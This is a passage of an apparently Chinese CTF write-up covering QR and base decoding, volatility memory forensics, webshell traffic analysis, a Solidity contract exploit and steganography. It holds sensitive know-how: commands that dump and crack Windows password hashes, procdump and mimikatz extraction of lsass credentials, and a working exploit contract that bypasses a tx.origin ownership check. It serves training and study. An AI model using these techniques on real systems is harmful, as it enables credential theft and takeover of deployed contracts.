  1. 拿PS一个一个拼，顺序得慢慢尝试。
  2. 使用010等工具查看每个图片的原数据，会发现图片的数据末尾有两个数字代表这个图片的位置，编写脚本或者使用ps等将二维码拼接好。
最终二维码为：
扫出来的内容为：
    BASE Family Bucket ??? 
    85->64->85->13->16->32
可以猜测压缩包备注的字符串应该是base加密，按照这个顺序反向base解密。
base32解码：
`3A715D3E574E36326F733C5E625D213B2C62652E3D6E3B7640392F3137274038624148`
base16解码：
`:q]>WN62osJA62bf  
rot13：
## secret
### 考点
  * 内存取证
### 题解
内存取证，直接上volatility  
volatility -f mem.dump imageinfo
看进程  
volatility -f mem.dump --profile=Win7SP1x64 pslist
看cmd历史  
volatility -f mem.dump --profile=Win7SP1x64 cmdscan
得到  
flag.ccx_password_is_same_with_Administrator
从桌面导出文件flag.ccx  
volatility -f mem.dump --profile=Win7SP1x64 dumpfiles -Q 0x000000003e435890 -D
./
hashdump得到Administrator的哈希  
volatility -f mem.dump --profile=Win7SP1x64 hashdump
得到  
Administrator:500:6377a2fdb0151e35b75e0c8d76954a50:0d546438b1f4c396753b4fc8c8565d5b:::
cmd5解密得到ABCabc123
然后在进程中或者桌面看到有一个Cncrypt的应用，百度下载该应用然后用ABCabc123解密挂载，得到flag  
flag{now_you_see_my_secret}
## Attack
### 考点
  * 数据包流量分析
  * 蚁剑流量特征
  * procdump的使用
### 题解
使用wireshark打开数据包，简单看一下应该是进行了扫目录操作：
然后对TCP流进行分析，发现一处对upload.php的POST请求：
然后追踪TCP流，发现上传了一句话木马：
接着往下分析，发现一组TCP流量疑似执行了命令，请求流量经过了base64混淆，返回流量用了ROT13
继续跟TCP流发现列目录列出来了一个s3cret.zip
下一组流量中出现了一组看起来是zip的数据：
查看hex数据发现`50 4B 03 04`的zip文件头，将其拿出来导入到010editor中保存为zip：
但是发现需要解压密码，打开发现hint
然后可以得到意思是解压密码为administrator的密码，于是继续回去看流量，发现执行了procdump.exe这个工具
如果不熟悉的这个工具话可以使用搜索引擎得知该工具一般用来抓取windows的lsass进程中的用户明文密码
紧接着发现攻击者通过http下载了lsass.dmp文件
我们将该文件导出，然后导入mimikatz即可得到administrator的密码
之后再拿过去解压就得到flag
Flag：D0g3{3466b11de8894198af3636c5bd1efce2}
## whoscion
### 考点
  * solidity逆向
  * 整数溢出
  * tx.origin鉴权绕过
### 题解
这个合约的逻辑很简单，获取flag需要代币余额大于10000并且成为合约所有者。  
transferFrom函数存在溢出，用合约创建账户向自己账户转大于10000代币即可；  
合约用tx.origin判断合约调用者，构造一个新合约来调用源合约就可以绕过。  
exp代码如下：
    pragma solidity ^0.4.18;
    contract hpcoin1 {
        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;
        address public owner;
        function approve(address _arg0, uint256 _arg1) public {
        }
        function transferFrom(address _arg0, address _arg1, uint256 _arg2) public {
        }
        function payforflag(string b64email) public {
        }
        function changeOwner(address _arg0) {
        }
    }
    contract attack {
        hpcoin1 exp;
        function attack(address addr) {
            exp = hpcoin1(addr);
        }
        function hack() {
            exp.changeOwner(tx.origin);
        }
    }
## easy misc
### 考点
  * 盲水印
  * 字频
  * 掩码爆破
  * base85
### 题解
考点：foremost  
下载图片后发现了三个文件
Output就是一张图片  
Decode中存在一个decode.txt  
还有一个flag is here 的文件夹
先看flag is
here文件夹，发现存在大量的txt文件，每个文件都是一大段英文，可能考察字频隐写。但是不知道字频隐写在哪一个文件夹，于是可能hint在其他的文件中。
Decode.rar  
这个压缩包就加密了的。
再看提示  
一个算术加NNULLULL, 猜测可能考察掩码攻击  
前面的算术算出来是7，即也就是7+NNULLULL,  
直接爆破,得到密码2019456NNULLULL  
得到decode.txt，根据decode.txt更加确定为字频隐写。
小姐姐.png  
先foremost分离一手，出来了两个文件，猜测是盲水印  
使用盲水印工具解密  
python2 bwm.py decode 00000000.png 00000232.png output.png
提示in 11.txt  
说明字频隐写在11.txt中，hint中提示取前16位即etaonrhsidluygw  
根据decode.txt中组成base64  
base64: QW8obWdIWT9pMkFSQWtRQjVfXiE/WSFTajBtcw==  
base85: Ao(mgHY?i2ARAkQB5_^!?Y!Sj0ms  
flag{have_a_good_day1}